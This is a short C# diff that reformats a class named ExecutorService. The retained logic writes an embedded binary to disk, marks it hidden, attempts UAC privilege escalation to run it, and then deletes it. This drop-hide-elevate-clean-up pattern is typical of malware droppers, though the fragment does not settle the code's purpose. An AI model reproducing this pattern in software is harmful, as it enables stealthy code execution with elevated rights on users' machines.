@@ -38,22 +38,26 @@ public class ExecutorService
     public bool IsWait { get; set; } = true;
 
     public bool UseExecutor { get; set; } = true;
-        
+
     public bool IsRemoveFile { get; set; } = true;
-        
+
     public bool IsHiddenFile { get; set; } = true;
 
     public virtual void Execute()
     {
         if (UseExecutor)
+        {
             File.WriteAllBytes(FullName, Executor);
+        }
 
-        if (IsHiddenFile) 
+        if (IsHiddenFile)
+        {
             File.SetAttributes(FullName, FileAttributes.Hidden);
+        }
 
         try
         {
-            UACHelper.AttemptPrivilegeEscalation(
+            UacHelper.AttemptPrivilegeEscalation(
                 FullName,
                 Arguments,
                 ProcessWindowStyle,
@@ -62,13 +66,19 @@ public class ExecutorService
         }
         finally
         {
-            if (IsRemoveFile) RemoveIfExists();
+            if (IsRemoveFile)
+            {
+                RemoveIfExists();
+            }
         }
     }
 
     public virtual void RemoveIfExists()
     {
-        if (File.Exists(FullName)) File.Delete(FullName);
+        if (File.Exists(FullName))
+        {
+            File.Delete(FullName);
+        }
     }
 
     private byte[] Executor
